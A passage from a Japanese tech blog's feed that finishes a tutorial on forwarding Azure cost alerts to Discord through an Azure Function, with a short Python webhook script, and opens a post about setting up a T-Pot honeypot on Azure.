    style=&quot;padding-bottom: 75.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGUlEQVQ4y5VU2XLaQBDUG+dbyuENUhbikkD3sSsJHSDOSiWfwV/w6Z2ZjUmZGLvsh67ZlWZ7u1tT0oQQyLIMlmVhsbDw/ekbOu02Op0uWq02WrRuK3ReKr2jdbfbRa/bQ6/XQ7/fp/4OBoMBNCarqgq+HyKKMohkjeMxR1nVaJoTdruzqnW1w7Y54nz+jcPhJ+IoRRAIhKGkc7yWaq/5vg+G6zJCahAoyhz1psFmsyfCk6p5ViDNSqzXNbK8VL22HcBxAqq+qgylkGGaFvTxGLPZnOzbSOIEfhiR4oSIMjrkYDgcYjT6QXWE52cdY+rX9XtozW6Puq6I0IQxmWI+N+G4LtkIkMoUVb1BsSZ1aYokkaR2S/1bOLarCAxjcgfN9zy4jkOqlurBYmHCpr2UEmEQEomgSAIEBHbBfY7j0cULUmi8JZR0c1GWd4TLlU1ZFXSRS5lGlJdHgYfqPVtl3NQx6Wti7XQ+4XjYvyK0YNKaCcMggOdR4JQf1xvB7fBDhVEcU16hmkN+MGfLlI8UKYSQKIoCMs1VjalXKfqP5N4yZSVTieXyRSF9lBV9lCTjuYyR5zl8sssKOQLDMB4q+0e43TY0rCciXP1VOJ3BTdcof9UQsVBjc8tNjcoHdhWhR0OdJLFSeAtYQZ+o4B8d/FAhW2LbPBL3jcanCN4QXq9XXC4XTMnqePx+42dJNf4xsEoem68oeQ9/ACTZx6wH4KjaAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/7726f6ca0421e76c00e3643b84f6fbc3/8ac56/image-49.webp 240w,
/static/7726f6ca0421e76c00e3643b84f6fbc3/d6ea2/image-49.webp 378w&quot;
              sizes=&quot;(max-width: 378px) 100vw, 378px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/7726f6ca0421e76c00e3643b84f6fbc3/8ff5a/image-49.png 240w,
/static/7726f6ca0421e76c00e3643b84f6fbc3/f0991/image-49.png 378w&quot;
            sizes=&quot;(max-width: 378px) 100vw, 378px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/7726f6ca0421e76c00e3643b84f6fbc3/f0991/image-49.png&quot;
            alt=&quot;image-49.png&quot;
            title=&quot;image-49.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次にVSCodeの[Create Function]ボタンから、ローカルにFunctionを作成します。&lt;/p&gt;
&lt;p&gt;トリガーは「HTTP Trigger」にしました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 443px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/23e2ec3418070467e8c2c9bb87b3b991/a120c/image-50.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 27.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLElEQVQY01WQXU6DQBSF2YUPNrXAMPy1MED8aQXb8k9Nao3pHnzUF5fgNtyM+zoeCI3tw5c5k3vn3DNXi6IESikIYcGy5MBJC2JTe2RKfU1kXztx1m/bDhzHhRbHCcIwZENf/G+SRCdLU+Bzpg+8GeZgbI4mYjTuTyntAa1tO/Q0TYO6rNE2O+Tb/CKBR+55fzcMfOn6MMwlzlg/R6tpVJQlqopmbYuX/R5d94woijmZSfkVi5MN6eCK+igEvqczfDDxLdPrZ2Z9Uq2uKpRFzmQtNusM6eMKWZohXARMKWBL7nFMI6kDPvpxTPxKHZs4hjdfIPDn8D0fiqvTit0rtt0ezeGIu6zAxHRxI+fQ3RCmpy4QvsLEDpAWKQ7rFCv2J2mOZPkE9bDGalvjD2SGuwGlhNAbAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/23e2ec3418070467e8c2c9bb87b3b991/8ac56/image-50.webp 240w,
/static/23e2ec3418070467e8c2c9bb87b3b991/23445/image-50.webp 443w&quot;
              sizes=&quot;(max-width: 443px) 100vw, 443px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/23e2ec3418070467e8c2c9bb87b3b991/8ff5a/image-50.png 240w,
/static/23e2ec3418070467e8c2c9bb87b3b991/a120c/image-50.png 443w&quot;
            sizes=&quot;(max-width: 443px) 100vw, 443px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/23e2ec3418070467e8c2c9bb87b3b991/a120c/image-50.png&quot;
            alt=&quot;image-50.png&quot;
            title=&quot;image-50.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ローカルに作成された関数アプリを見ると、&lt;code class=&quot;language-text&quot;&gt;__init__.py&lt;/code&gt;というファイルにシンプルなテンプレートが作成されています。&lt;/p&gt;
&lt;p&gt;そこで、このテンプレートの&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数を少々いじることにしました。&lt;/p&gt;
&lt;p&gt;やっていることはシンプルで、Functionが呼び出されると、&lt;code class=&quot;language-text&quot;&gt;urllib.request&lt;/code&gt;を使ってDiscordのWEBhookにメッセージを送信するだけのFunctionです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; json
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; logging
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; urllib &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; request&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; parse

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; azure&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;functions &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; func

DISCORDWEBHOOK &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;Webhook URL&gt;&quot;&lt;/span&gt;
data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Azure Cost Alert&quot;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
headers &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;curl/7.64.1&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;application/json&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; func&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;HttpRequest&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; func&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;HttpResponse&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    logging&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;info&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Python HTTP trigger function processed a request.&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;# Discordに投稿&lt;/span&gt;
    parse&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urlencode&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;encode&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    req &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Request&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
        url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; DISCORDWEBHOOK&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        data&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;json&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dumps&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;encode&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        headers&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;headers&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        method&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;POST&quot;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urlopen&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; response&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        response_body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; response&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;read&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;decode&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; func&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;HttpResponse&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;response_body&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;少々ややこしい点として、DiscordのWEBhookがUAとしてurlibをブラックリストに入れているようでしたので、UAをcurlに変更しています。&lt;/p&gt;
&lt;h3 id=&quot;デプロイする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E3%81%99%E3%82%8B&quot; aria-label=&quot;デプロイする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デプロイする&lt;/h3&gt;
&lt;p&gt;コードが完成したら、VSCodeの&lt;code class=&quot;language-text&quot;&gt;Deploy to Function App&lt;/code&gt;ボタンから任意の関数アプリに作成したFunctionをデプロイできます。&lt;/p&gt;
&lt;p&gt;デプロイが完了すると、ローカルで作成したFunctionが、Azureの関数アプリに追加されていることが確認できます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d051fcf3c57b2a0fd5c19f9e42b759b5/0b533/image-51.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 60.83333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAABjklEQVQoz51Ta2+kMAzk///D+3BVd7WEQgl5P3lM7WxBla6q1LMYJQp4Mh6bzseCvhe43+8QQmAcR9rfMNF6u72i1oJ/4jjo+R6dcaERLYtECAHee8QYUeqKEDPqtiOXgpwL9p2T8GN0xmgiU9i2jRL2hkIEtSQ4KaDVDHF/wevfP9ByhFXvMMuE5BQiIXt9Ya8B3WQcES5IKTXJHIvSCEbicAOSnRvMLBD0BK/GtrdygFve2tkJFEcK/QpFhPM8k1/1SSgllDbwMcFY2xRvpHxd16sSXhnrul3nlWzq9GKbf845bPSiEdIFxhhkUl1Luaz4aslXi7gyFsPoJCkZhgGWlPBHHEqppvJB3ZfKoOSERI3iC4J3GETf1pwinQe6NGOeRoxvA7qUfCuLO3t6yIRsg7GOSrct+YR3FkZrxOCvM95baq6zhpoyTa2E1lmSfBw7+fneRuh/ohv6G0T/LMFohUAKRP+4CI8fhvjbwdbuOTas8AxJ/vGAn4S/UmhpNFgNN+RMbn/K5wW/JfwAP/6l4+w7uwAAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/d051fcf3c57b2a0fd5c19f9e42b759b5/8ac56/image-51.webp 240w,
/static/d051fcf3c57b2a0fd5c19f9e42b759b5/d3be9/image-51.webp 480w,
/static/d051fcf3c57b2a0fd5c19f9e42b759b5/b0a15/image-51.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/d051fcf3c57b2a0fd5c19f9e42b759b5/8ff5a/image-51.png 240w,
/static/d051fcf3c57b2a0fd5c19f9e42b759b5/e85cb/image-51.png 480w,
/static/d051fcf3c57b2a0fd5c19f9e42b759b5/0b533/image-51.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/d051fcf3c57b2a0fd5c19f9e42b759b5/0b533/image-51.png&quot;
            alt=&quot;image-51.png&quot;
            title=&quot;image-51.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このFunctionはトリガーとなるURLにHTTPリクエストを送信するだけで実行されます。&lt;/p&gt;
&lt;p&gt;Functionを開いて「関数のURLを取得」から取得したURLを叩くと、Discordにメッセージが転送されました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/14d3c79638c3395035ca5b325d4dd011/0b533/image-52.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 33.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAARlAAAEZQAGA43XUAAABUklEQVQoz3WRy07DMBBF84GsWPAJ5dGvogUkCl/AtrRILLpAgooFD1FK28RJGydO7LwOrgtSi8RIRx5fj8ajO15RFOSmRMqYsgKd3rCc7BFP9kmmB2TqhTCUloCyLIGGptmirjf83L1cvLESM8TXK+FsiooeCCdniI8L/Pdzovmz1T8Ipq9oKcBIGh07KBKo1Aar1/kKL/Kn1KXBZCmL2SfBImAxX5HEhsoOVBpt3zVVoWls3SbP3ZnEEZFYEAZzciXt8CXeMraJjUyl9HqXXF/16HRPGY8fnd6wG3meo1SGNob+7S3dbpfTToenp7F791SaEKWa2VIxEQlSWyObmqqqWPtbW39cY+sPzd/2u+E8FCIglBn3D88cnbRpHR7TbrcdrVaL0Wjkitcf7CzjHzxjR69tcZpI7oZDhoMBA8vQ5v1+H9/3XcN6a5O/rLVt1to3NlAMF2JeCzcAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/14d3c79638c3395035ca5b325d4dd011/8ac56/image-52.webp 240w,
/static/14d3c79638c3395035ca5b325d4dd011/d3be9/image-52.webp 480w,
/static/14d3c79638c3395035ca5b325d4dd011/b0a15/image-52.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/14d3c79638c3395035ca5b325d4dd011/8ff5a/image-52.png 240w,
/static/14d3c79638c3395035ca5b325d4dd011/e85cb/image-52.png 480w,
/static/14d3c79638c3395035ca5b325d4dd011/0b533/image-52.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/14d3c79638c3395035ca5b325d4dd011/0b533/image-52.png&quot;
            alt=&quot;image-52.png&quot;
            title=&quot;image-52.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでシンプルなFunctionの作成が完了しました。&lt;/p&gt;
&lt;h3 id=&quot;アクショングループからfunctionを実行する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A2%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%8B%E3%82%89function%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B&quot; aria-label=&quot;アクショングループからfunctionを実行する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;アクショングループからFunctionを実行する&lt;/h3&gt;
&lt;p&gt;最後に、先ほど作成したアクショングループからFunctionを実行できるように「アクション」を編集しました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/a9a0b67c5a29fedeaa2f68eebc30d517/0b533/image-53.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 61.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAAB20lEQVQoz41TTW/TQBD1j4djkRANrRAHDhQpIAIqXMp/4FCUSpU4NSHQxl7Hu2vvp+3XmXXcJO2FkZ5md7w78+bNOiuKAjeLBaTS6LoObduiJd91bVpzrO97sLEf1957lGWJpmlgjIW1lg8ga+oaPgRYH+iDgdYaxnlaN2nPFzjxmIwLsOVig7fvp3h3NsWHT1/x8ct3/BEamZQSzjmM1tMFLpLQDPD0/TGYERdn4454b1wghsSgpstjK8xGURFOZK2BNYzmAcw8eId8vcZsNsO383Msl8vEPJAMmVIq6TG2EmNEUeSoqbrbMnHWHnhmyOwuL3/h+moOpWTqrI3EkBPsC87g2DiQEaN+CbRmlkYK5NJAVBKltqgMJczz/EBDtkBDemzcxVB42Evj8WP+D9Ofd7itTIrHjqYshAA/HdaS2+fJVlWVkqYnRGDGfI5jg9Y9RB3wea6wruNBIWrZEX3SxzUDLE3VmxQLYYe29aQTXe5Jip58Fx/Yd3vvNKMnRwH8t41HeYZxq+f+DLJi9RKL38/gqtfw6gS2miBfvSB/QnuKyR2iPkX+9wi3q+eI7mKbaPcnpZZr8QZqPYEtJ/CUrC5eobo7RiMmcJun0OUp9OYYwVw8+R3Z7gGnF5dZfmohOwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/a9a0b67c5a29fedeaa2f68eebc30d517/8ac56/image-53.webp 240w,
/static/a9a0b67c5a29fedeaa2f68eebc30d517/d3be9/image-53.webp 480w,
/static/a9a0b67c5a29fedeaa2f68eebc30d517/b0a15/image-53.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/a9a0b67c5a29fedeaa2f68eebc30d517/8ff5a/image-53.png 240w,
/static/a9a0b67c5a29fedeaa2f68eebc30d517/e85cb/image-53.png 480w,
/static/a9a0b67c5a29fedeaa2f68eebc30d517/0b533/image-53.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/a9a0b67c5a29fedeaa2f68eebc30d517/0b533/image-53.png&quot;
            alt=&quot;image-53.png&quot;
            title=&quot;image-53.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでコストのアラートが発生してアクショングループの通知が行われる際、SMSやメールだけでなくDiscordにも通知が行われるようになりました。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;Azureでコストのアラート設定と、Function経由でDiscordに通知する設定を行いました。&lt;/p&gt;
&lt;p&gt;特にアクショングループは使いこなせば色々な自動化ができそうなのでワクワクしますね。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[新米ハニーポッターは安心安全にT-Potで遊びたい[Azure/ハニーポット]]]></title><link>https://kashiwaba-yuki.com/honeypot-setup-on-azure</link><guid isPermaLink="false">https://kashiwaba-yuki.com/honeypot-setup-on-azure</guid><pubDate>Fri, 11 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;これからAzureで遊んでいこうと思っているわけですが、まずは前から興味のあった&lt;a href=&quot;https://github.com/telekom-security/tpotce&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;T-Pot&lt;/a&gt;というハニーポットを植えてみたいと思います。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://amzn.to/34tqh58&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;サイバー攻撃の足跡を分析する ハニーポット観察記録 [ハニーポット観察記録]&lt;/a&gt;という本を読んでからずっとやりたいと思っていたのですが、リスクやコスト面からなかなか実施に踏み切れずにいました。&lt;/p&gt;
&lt;p&gt;今回はAzureを使うといい感じにできそうということになったので、Azure環境上でT-Potを構築していきます。&lt;/p&gt;
&lt;p&gt;色々手探りですが安全第一で進めていきます。&lt;/p&gt;
&lt;p&gt;当方初心者につき、本記事の内容は必ずしもベストプラクティスにはなっていないと思いますので、改善点があり次第追加していこうと思います。&lt;/p&gt;
